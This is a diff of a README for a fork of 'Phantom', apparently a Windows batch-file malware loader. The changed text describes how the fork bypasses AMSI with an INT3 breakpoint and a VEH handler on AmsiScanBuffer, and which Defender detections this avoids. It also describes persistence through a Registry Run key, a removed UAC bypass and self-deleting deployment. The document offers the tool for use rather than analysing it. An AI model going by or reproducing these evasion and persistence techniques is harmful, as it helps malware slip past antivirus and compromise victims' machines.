@@ -33,7 +33,7 @@ Output is a single `.bat` file with no dependencies. Works on Windows 7+.
 
 ## What's different in this fork (vs c5hackr/Phantom)
 
-- **AMSI bypass added** — original c5 code had no AMSI bypass at all (PowerShell used bare `[Assembly]::Load(byte[])`, C# stub had none). This fork adds a working INT3 VEH bypass in both the PowerShell decryption script and the loaded C# stub (CLR/COM triggers a second `AmsiScanBuffer`). VEH handler zeroes return at `sp+0x30`. No `VirtualProtect` on `amsi.dll` — avoids `Behavior:Win32/SuspAmsiPatch.F/K`.
+- **AMSI bypass changed** — original c5 used `BStub.cs` with `VirtualProtect` + `Marshal.Copy` to overwrite `AmsiScanBuffer` prologue with `mov eax, 0x80070057; ret` (hardcoded RVAs for Win10/Win11). This fork switched to INT3 (`0xCC`) at `AmsiScanBuffer` entry + VEH handler zeroes return at `sp+0x30`. No `VirtualProtect` on `amsi.dll` — avoids `Behavior:Win32/SuspAmsiPatch.F/K`. Dual-context: both the PowerShell decryption script and the loaded C# stub get their own bypass (CLR/COM triggers a second `AmsiScanBuffer`).
 - **UAC Bypass removed** — original used `wusa.exe` DLL sideloading (fodhelper variant). Removed because it's unreliable and Defender flags it.
 - **No VBS in startup** — Registry Run key points directly to `cmd.exe /c batchpath` instead of a `.vbs` launcher, eliminating `Trojan:VBS/Runner.LPAA!MTB`.
 - **AppData‑aware self‑delete** — startup copies in `%APPDATA%` are never deleted; only the original deployment batch melts itself.
